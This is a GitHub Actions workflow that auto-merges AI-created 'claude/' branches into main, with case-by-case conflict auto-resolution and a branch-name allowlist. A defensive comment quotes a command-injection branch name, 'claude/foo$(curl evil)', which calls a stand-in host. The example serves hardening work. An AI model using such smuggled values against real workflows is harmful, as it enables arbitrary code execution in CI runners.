name: Auto-merge claude/* branches to main

# Background:
# The Claude Code routine container that runs the intel and quality-audit
# CTI workflows checks out a `claude/<adjective>-<name>-<id>` branch
# on session start. The prompt's Phase 6 commits the brief, syncs the
# feature branch with `origin/main` (with local auto-resolution for
# state/* and sources/sources.json conflicts), and pushes the feature
# branch — never directly to `main`, per repo policy.
#
# This workflow is the authoritative merge gate. On every push to a
# `claude/**` branch, it merges the feature branch into `main` (or
# detects "already merged") and deletes the feature branch. End state:
# the brief is on `main`, ready for `deploy-site.yml`.
#
# Why the workflow needs its own conflict auto-resolution:
# The routine's `git fetch origin main` may go through a stale local
# proxy (the routine container has been observed cloning main hours
# behind the github.com tip). The workflow runs on a github-hosted
# runner that fetches main directly from github.com — so a conflict
# the routine couldn't see locally still surfaces here. Without an
# auto-resolution step, every such race becomes operator toil.
#
# Three cases are handled (in order):
#   1. Fast-forward — the feature branch is a strict descendant of main
#      (common case when the routine's sync step worked). Fast-forward
#      main; delete the feature branch.
#   2. Already merged — the feature branch is an ancestor of main.
#      Delete the feature branch.
#   3. Main advanced — both branches have unique commits. Try a regular
#      merge. If git auto-resolves cleanly, push main + delete branch.
#      If it conflicts, apply the auto-resolution rules:
#         - state/cves_seen.json, state/source_health.json,
#           entities/registry.yaml → "ours"
#           (the routine's version: it has the freshest state for the
#           run that just completed; main's appended state from earlier
#           runs is already merged in via the merge commit's other
#           parent for non-conflicting fields)
#         - sources/sources.json → "theirs" (main's version: sources
#           are maintained outside routines via human-reviewed PRs;
#           the routine only writes transient `last_successful_fetch`
#           fields that the next run resets anyway)
#      After auto-resolution, complete the merge, push main, delete the
#      branch. Any remaining conflict in other paths fails loud with an
#      `::error::` annotation so the operator notices and resolves.
#
# This workflow is shell-only — no third-party Actions — because the
# org's policy restricts Actions to the OwlsNightCatch org. The work
# `actions/checkout` would do is replaced with a manual `git init` +
# `git remote add` + `git fetch` using the default GITHUB_TOKEN.

on:
  push:
    branches:
      - "claude/**"
  # Allow manual triggering for branches pushed before this workflow
  # existed, or when an automatic run needs to be re-attempted.
  workflow_dispatch:
    inputs:
      branch:
        description: "Feature branch to merge into main (e.g. claude/determined-hypatia-PCpxM)"
        required: true
        type: string

permissions:
  contents: write

# Avoid simultaneous merges from racing each other on a fast-moving feed.
concurrency:
  group: auto-merge-claude
  cancel-in-progress: false

jobs:
  merge:
    runs-on: ubuntu-latest
    steps:
      - name: Clone repo (shell-only, no Actions)
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
        run: |
          set -euo pipefail
          git init -q .
          git remote add origin "https://x-access-token:${GH_TOKEN}@github.com/${REPO}.git"
          # Full history of main is needed so `merge-base --is-ancestor`
          # can decide if origin/<feature> is a strict descendant of main.
          git fetch --no-tags origin main
          git checkout -B main origin/main
          git config user.name  "Claude Code"
          git config user.email "noreply@anthropic.com"

      - name: Determine source branch
        id: branch
        # Untrusted inputs (`github.event.inputs.branch`, `github.ref_name`)
        # are read via env vars, NOT interpolated directly into the shell
        # body. A branch named e.g. `claude/foo$(curl evil)` would otherwise
        # let a workflow_dispatch caller — or a push of a pathological branch
        # name — execute arbitrary shell here.
        env:
          INPUT_BRANCH: ${{ github.event.inputs.branch }}
          REF_BRANCH: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          if [ -n "${INPUT_BRANCH:-}" ]; then
            BRANCH="$INPUT_BRANCH"
          else
            BRANCH="$REF_BRANCH"
          fi
          # Strict allowlist for the branch name — must be `claude/<token>`
          # where token is alphanumeric + `-` `_` `.` `/`. Anything else
          # is rejected loudly. This is defence-in-depth: branch names with
          # shell metacharacters cannot have come from the routine, but a
          # workflow_dispatch caller could attempt one.
          case "$BRANCH" in
            claude/*) ;;
            *)
              echo "refused: branch '$BRANCH' is not under claude/" >&2
              exit 1
              ;;
          esac
          if printf '%s' "$BRANCH" | grep -qE '[^A-Za-z0-9._/-]'; then
            echo "refused: branch '$BRANCH' contains disallowed characters" >&2
            exit 1
          fi
          echo "name=$BRANCH" >> "$GITHUB_OUTPUT"

      - name: Merge feature branch into main
        env:
          BRANCH: ${{ steps.branch.outputs.name }}
        run: |
          set -euo pipefail

          # Pull the feature branch into local refs. The strict allowlist
          # in the previous step guarantees `$BRANCH` cannot start with `-`.
          git fetch origin "$BRANCH"

          # Case 1 — fast-forward. Feature branch is a strict descendant
          # of main. This is the common path when no other work landed
          # on main during the routine's run.
          if git merge-base --is-ancestor main "origin/$BRANCH"; then
            echo "::notice::origin/$BRANCH fast-forwards from main; FF merge."
            git merge --ff-only "origin/$BRANCH"
            git push origin main
            git push origin --delete "$BRANCH" || true
            echo "Merged $BRANCH into main (fast-forward); deleted feature branch."
            exit 0
          fi

          # Case 2 — already merged. Feature branch tip is an ancestor
          # of main (e.g. PR-merged via the GitHub UI without deleting
          # the branch, or a re-push of already-landed work). Just
          # delete the feature branch.
          if git merge-base --is-ancestor "origin/$BRANCH" main; then
            echo "::notice::origin/$BRANCH is already in main; deleting feature branch."
            git push origin --delete "$BRANCH" || true
            echo "Deleted feature branch $BRANCH (already merged)."
            exit 0
          fi

          # Case 3 — main advanced. Both branches have unique commits.
          # Try a regular merge (creates a merge commit). Most routine
          # runs touch disjoint paths (entries/<date>/<slug>.md and
          # runs/<date>/<run-id>.md are unique per run; state JSON and
          # registry appends are usually at non-overlapping positions),
          # so git's auto-merge resolves cleanly.
          echo "::warning::main advanced since $BRANCH was created; attempting merge commit."
          if git merge --no-edit -m "Auto-merge $BRANCH into main" "origin/$BRANCH"; then
            git push origin main
            git push origin --delete "$BRANCH" || true
            echo "Merged $BRANCH into main (merge commit); deleted feature branch."
            exit 0
          fi

          # Conflict — apply the auto-resolution rules described in the
          # header. Walk every conflicted path; resolve known patterns;
          # if anything is left unresolved, abort and fail loud.
          UNRESOLVED=""
          while IFS= read -r conflict_path; do
            [ -z "$conflict_path" ] && continue
            case "$conflict_path" in
              state/cves_seen.json|state/source_health.json|entities/registry.yaml)
                echo "::notice::auto-resolving $conflict_path with --ours (routine's fresh state)"
                git checkout --ours -- "$conflict_path"
                git add -- "$conflict_path"
                ;;
              sources/sources.json)
                echo "::notice::auto-resolving $conflict_path with --theirs (main's curated sources)"
                git checkout --theirs -- "$conflict_path"
                git add -- "$conflict_path"
                ;;
              *)
                UNRESOLVED="${UNRESOLVED}${conflict_path}"$'\n'
                ;;
            esac
          done < <(git diff --name-only --diff-filter=U)

          if [ -n "$UNRESOLVED" ]; then
            echo "::error::Merge conflict in paths outside the auto-resolution rules; resolve manually."
            printf '%s' "$UNRESOLVED"
            git merge --abort || true
            exit 1
          fi

          # All conflicts auto-resolved — complete the merge.
          git commit -m "Auto-merge $BRANCH into main (auto-resolved: state/* → ours, sources/sources.json → theirs)"
          git push origin main
          git push origin --delete "$BRANCH" || true
          echo "Merged $BRANCH into main (merge commit + auto-resolution); deleted feature branch."
          exit 0
